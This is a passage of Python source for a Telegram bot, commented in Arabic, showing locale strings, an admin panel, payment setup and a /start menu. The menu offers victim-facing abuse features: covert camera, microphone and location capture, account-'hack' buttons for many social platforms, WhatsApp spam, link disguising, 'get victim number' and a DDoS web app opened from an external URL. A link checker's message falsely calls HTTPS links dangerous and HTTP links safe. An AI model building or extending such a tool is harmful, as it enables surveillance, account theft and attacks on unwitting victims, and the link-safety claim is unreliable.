                "domain_saved": "✅ Domain saved.\n\nEnter the keywords (e.g., -login-now):",
                "invalid_domain": "❌ Invalid domain format. Send a valid domain (e.g., example.com).",
                "disguised_links_header": "<b>[~] Disguised Links:</b>\n",
                "original_link_display": "<b>Original Link:</b> {}\n\n",
                "invalid_phone_number": "❌ Invalid phone number. Please send a correct number with country code.",
                "sending_spam": "⏳ Sending spam message...",
                "spam_sent_success": "✅ Spam message sent successfully!",
                "link_secure": "✅ <b>Safe.</b>\nThis link appears to use the standard HTTP protocol.",
                "link_insecure": "🚨 <b>Danger!</b>\nThis link was detected as potentially harmful because it uses the encrypted HTTPS protocol.",
                "link_unknown": "⚠️ Cannot determine link status. Please send a link starting with http or https.",
                "tts_processing": "⏳ Converting text to voice message...",
                "tts_error": "❌ An error occurred during conversion. Please try again later.",
                "service_busy": "❌ Sorry, the service is currently busy. Please try again later.",
                "zakhrafa_done": "<b>Decoration complete:</b>\n\n{}",
                "choose_zakhrafa_lang": "Choose the language of the text to decorate:",
                "ask_zakhrafa_text": "Send the text in <b>{}</b> to be decorated.",
                "lang_ar": "Arabic",
                "lang_en": "English",
                # --- Download Data Feature Texts (New) ---
                "download_data_header": "📥 Choose the data you want to download:",
                "download_users_button": "👥 Users",
                "download_admins_button": "👑 Admins",
                "download_banned_button": "🚫 Banned",
                "download_channels_button": "📢 Sub. Channels",
                "download_paid_users_button": "⭐ Paid Users",
                "file_not_found": "⚠️ File not found or is empty.",
            }
        }
        return locales.get(lang_code, locales["ar"])

    # --- قسم تغيير اللغة ---
    def language_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("العربية 🇪🇬", callback_data="set_lang_ar"),
            InlineKeyboardButton("English 🇬🇧", callback_data="set_lang_en")
        )
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=locale["choose_language"], reply_markup=kb
            )
        except Exception as e:
            print(f"Error in language_panel: {e}")

    def set_language(call):
        lang_code = call.data.replace("set_lang_", "")
        set_setting(language_file, lang_code)
        locale = get_locale(lang_code)
        bot.answer_callback_query(call.id, locale["language_changed"], show_alert=True)
        admin_panel(call.message)

    # --- قسم تحميل البيانات (جديد) ---
    def download_data_panel(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton(locale["download_users_button"], callback_data="download_file_users.txt"),
            InlineKeyboardButton(locale["download_admins_button"], callback_data="download_file_admins.txt")
        )
        kb.add(
            InlineKeyboardButton(locale["download_banned_button"], callback_data="download_file_banned.txt"),
            InlineKeyboardButton(locale["download_channels_button"], callback_data="download_file_channels.txt")
        )
        kb.add(InlineKeyboardButton(locale["download_paid_users_button"], callback_data="download_file_paid_users.txt"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=locale["download_data_header"], reply_markup=kb
            )
        except Exception as e:
            print(f"Error in download_data_panel: {e}")

    def send_data_file(call):
        locale = get_locale()
        file_name = call.data.replace("download_file_", "")
        file_path = os.path.join(data_dir, file_name)
        
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            try:
                with open(file_path, "rb") as doc:
                    bot.send_document(call.message.chat.id, doc, caption=f"📄 `Here is the {file_name} file`")
                bot.answer_callback_query(call.id)
            except Exception as e:
                bot.answer_callback_query(call.id, f"Error sending file: {e}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, locale["file_not_found"], show_alert=True)
    # --- منطق إعداد الدفع بالنجوم ---
    def show_stars_setup_info(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_admin"))
        setup_text = """
🌟 <b>متطلبات تفعيل الدفع بنجوم تيليجرام (Telegram Stars)</b>

1️⃣  اذهب إلى @BotFather > `/mybots` > اختر هذا البوت.
2️⃣  اختر "Payments" ثم اختر مزود دفع (مثل Stripe) واتبع التعليمات.
3️⃣  بعد الربط، أرسل الأمر التالي هنا في بوتك:
    `/stars <توكن_مزود_الدفع>`

<b>مثال:</b> `/stars 123456:TEST:abcdefg`
"""
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=setup_text, reply_markup=kb
            )
        except Exception as e:
            print(f"Error in show_stars_setup_info: {e}")

    @bot.message_handler(commands=['stars'])
    def set_stars_provider_token(message):
        user_id = str(message.from_user.id)
        if user_id != str(owner_id):
            bot.reply_to(message, "❌ هذا الأمر مخصص لمالك البوت فقط.")
            return
        try:
            provider_token = message.text.split(' ', 1)[1]
        except IndexError:
            bot.reply_to(message, "⚠️ صيغة الأمر خاطئة. أرسل:\n`/stars <توكن_مزود_الدفع>`")
            return
        stars_config = get_json_data(stars_config_file)
        stars_config['provider_token'] = provider_token
        save_json_data(stars_config_file, stars_config)
        bot.reply_to(message, "✅ تم حفظ توكن مزود الدفع.\n\nالآن، أرسل عدد النجوم المطلوب لكل <b>يوم</b> اشتراك.")
        set_state(user_id, {"action": "set_stars_per_day"})

    def set_stars_per_day(message):
        user_id = str(message.from_user.id)
        if user_id != str(owner_id): return
        try:
            stars_per_day = int(message.text.strip())
            if stars_per_day <= 0:
                bot.reply_to(message, "❌ يرجى إرسال عدد نجوم أكبر من صفر.")
                return
        except ValueError:
            bot.reply_to(message, "❌ يرجى إرسال أرقام فقط.")
            return
        stars_config = get_json_data(stars_config_file)
        stars_config['stars_per_day'] = stars_per_day
        save_json_data(stars_config_file, stars_config)
        bot.reply_to(message, f"✅ تم الحفظ! سعر الاشتراك الآن هو <b>{stars_per_day}</b> نجمة لكل يوم.")
        set_state(user_id, None)

    # --- دالة بناء لوحة تحكم الأدمن (مُحدّثة بالكامل) ---
    def get_admin_panel():
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        total_users = len(get_lines(subscribers_file))
        
        kb.add(InlineKeyboardButton(locale["subscribers_count"].format(total_users), callback_data="m1"))
        kb.row(
            InlineKeyboardButton(locale["broadcast_button"], callback_data="send"),
            InlineKeyboardButton(locale["forward_button"], callback_data="forward")
        )
        kb.row(
            InlineKeyboardButton(locale["add_channel_button"], callback_data="add_ch"),
            InlineKeyboardButton(locale["delete_channel_button"], callback_data="del_ch")
        )
        kb.row(
            InlineKeyboardButton(locale["notify_on_button"], callback_data="ons"),
            InlineKeyboardButton(locale["notify_off_button"], callback_data="ofs")
        )
        kb.row(
            InlineKeyboardButton(locale["bot_on_button"], callback_data="obot"),
            InlineKeyboardButton(locale["bot_off_button"], callback_data="ofbot")
        )
        kb.row(
            InlineKeyboardButton(locale["ban_button"], callback_data="ban"),
            InlineKeyboardButton(locale["unban_button"], callback_data="unban")
        )
        kb.row(
            InlineKeyboardButton(locale["add_admin_button"], callback_data="add_admin"),
            InlineKeyboardButton(locale["rem_admin_button"], callback_data="rem_admin")
        )
        kb.row(
            InlineKeyboardButton(locale["paid_mode_button"], callback_data="set_paid"),
            InlineKeyboardButton(locale["free_mode_button"], callback_data="set_free")
        )
        kb.row(
            InlineKeyboardButton(locale["add_paid_button"], callback_data="add_paid"),
            InlineKeyboardButton(locale["rem_paid_button"], callback_data="rem_paid")
        )
        kb.add(InlineKeyboardButton(locale["set_stars_button"], callback_data="setup_stars_payment"))
        
        if has_premium_features():
            kb.row(
                InlineKeyboardButton(locale["manage_payment_button"], callback_data="manage_payment_methods"),
                InlineKeyboardButton(locale["buttons_section_button"], callback_data="manage_buttons")
            )
            kb.add(InlineKeyboardButton(locale["change_language_button"], callback_data="change_language"))

        kb.add(InlineKeyboardButton(locale["download_data_button"], callback_data="download_data"))
        kb.add(InlineKeyboardButton(locale["edit_start_msg_button"], callback_data="set_start_msg"))
        return kb

    @bot.message_handler(commands=['admin'])
    def admin_panel(message):
        if not is_admin(message.from_user.id): return
        set_state(message.from_user.id, None)
        locale = get_locale()
        kb = get_admin_panel()
        bot.send_message(message.chat.id, locale["welcome_panel"], reply_markup=kb)

    # --- دالة /start الكاملة والصحيحة (مُحدّثة بالكامل) ---
    @bot.message_handler(commands=['start'])
    def start_new(message):
        user_id = str(message.from_user.id)
        locale = get_locale()
        
        try:
            inviter_id = message.text.split()[1]
            invited_by_file = os.path.join(data_dir, "invited_by.json")
            invited_users = get_json_data(invited_by_file)
            if user_id not in invited_users and user_id != inviter_id:
                invited_users[user_id] = inviter_id
                save_json_data(invited_by_file, invited_users)
                add_user_points(inviter_id, 1)
                try:
                    bot.send_message(inviter_id, f"🎉 A new user joined via your link! You got 1 point.\nYour current balance: {get_user_points(inviter_id)} points.")
                except: pass
        except (IndexError, ValueError): pass

        if not is_bot_enabled() and not is_admin(user_id):
            bot.send_message(message.chat.id, locale["bot_under_maintenance"])
            return
        if is_user_banned(user_id):
            bot.send_message(message.chat.id, locale["user_banned"])
            return

        is_subscribed, not_subscribed_channels = is_user_subscribed(user_id)
        if not is_subscribed:
            kb = InlineKeyboardMarkup()
            for ch in not_subscribed_channels:
                kb.add(InlineKeyboardButton(f"📢 Subscribe to @{ch}", url=f"https://t.me/{ch}"))
            kb.add(InlineKeyboardButton(locale["subscribed_button"], callback_data="check_force_sub"))
            bot.send_message(message.chat.id, locale["must_subscribe"], reply_markup=kb)
            return

        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id):
            kb = InlineKeyboardMarkup(row_width=2)
            payment_methods = get_json_data(payment_methods_file)
            if payment_methods and has_premium_features():
                kb.add(InlineKeyboardButton("💳 Subscribe (Regular Payment)", callback_data="subscribe_start"))
            stars_config = get_json_data(stars_config_file)
            if stars_config.get('provider_token') and stars_config.get('stars_per_day') and has_premium_features():
                kb.add(InlineKeyboardButton("🌟 Subscribe (Pay with Stars)", callback_data="subscribe_stars_start"))
            
            if kb.keyboard:
                 kb.row(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))
            else:
                 kb.add(InlineKeyboardButton(locale["contact_developer_button"], url=f"tg://user?id={owner_id}"))

            bot.send_message(
                message.chat.id,
                """<b>Welcome! 🌟</b>\n\nTo take full advantage of the bot's features, please subscribe to one of the paid plans.""",
                reply_markup=kb
            )
            return

        if user_id not in get_lines(subscribers_file):
            add_line(subscribers_file, user_id)

        start_message_text = get_setting(start_message_file, locale["welcome_user"])
        
        if not is_bot_paid_to_factory():
            factory_rights = f'\n<a href="http://t.me/llUUU9">{locale["factory_link_text"]}</a>'
            if locale["factory_link_text"] not in start_message_text:
                 start_message_text += factory_rights
        # --- بناء الأزرار الديناميكي والكامل (مُحدّث بالكامل) ---
        kb = InlineKeyboardMarkup(row_width=2)
        hidden_buttons = get_json_data(hidden_buttons_file)
        
        base_buttons = {
            "cam_back": locale["cam_back_btn"], "cam_front": locale["cam_front_btn"],
            "mic_record": locale["mic_record_btn"], "location": locale["location_btn"],
            "record_video": locale["record_video_btn"], "surveillance_cams": locale["surveillance_cams_btn"],
            "insta_hack": locale["insta_hack_btn"], "whatsapp_hack": locale["whatsapp_hack_btn"],
            "pubg_hack": locale["pubg_hack_btn"], "facebook_hack": locale["facebook_hack_btn"],
            "tiktok_hack": locale["tiktok_hack_btn"], "ff_hack": locale["ff_hack_btn"],
            "discord_hack": locale["discord_hack_btn"], "roblox_hack": locale["roblox_hack_btn"],
            "ask_wormgpt": locale["ask_wormgpt_btn"], "snapchat_hack": locale["snapchat_hack_btn"],
            "interpret_dream": locale["interpret_dream_btn"], "device_info": locale["device_info_btn"],
            "akinator_fake_error": locale["akinator_fake_error_btn"], "ddos_webapp": locale["ddos_webapp_btn"],
            "intelligence_game": locale["intelligence_game_btn"], "high_quality_shot": locale["high_quality_shot_btn"],
            "fake_gmail": locale["fake_gmail_btn"], "get_visa": locale["get_visa_btn"],
            "fake_number": locale["fake_number_btn"], "get_victim_number": locale["get_victim_number_btn"],
            "check_link": locale["check_link_btn"], "hack_wifi": locale["hack_wifi_btn"],
            "radio_menu": locale["radio_menu_btn"], "zakhrafa": locale["zakhrafa_btn"],
            "text_to_speech": locale["text_to_speech_btn"], "hunt_usernames": locale["hunt_usernames_btn"],
            "booming_link_start": locale["booming_link_start_btn"], "full_hack_info": locale["full_hack_info_btn"],
            "hide_link": locale["hide_link_btn"], "whatsapp_spam": locale["whatsapp_spam_btn"]
        }
        
        buttons_to_show = []
        for btn_id, btn_text in base_buttons.items():
            if btn_id not in hidden_buttons:
                if btn_id == "ddos_webapp":
                    ddos_url = "https://flourishing-bienenstitch-bba64d.netlify.app/"
                    buttons_to_show.append(InlineKeyboardButton(btn_text, web_app=WebAppInfo(ddos_url)))
                elif btn_id == "fake_gmail":
                    gmail_url = "https://illustrious-pony-032b95.netlify.app
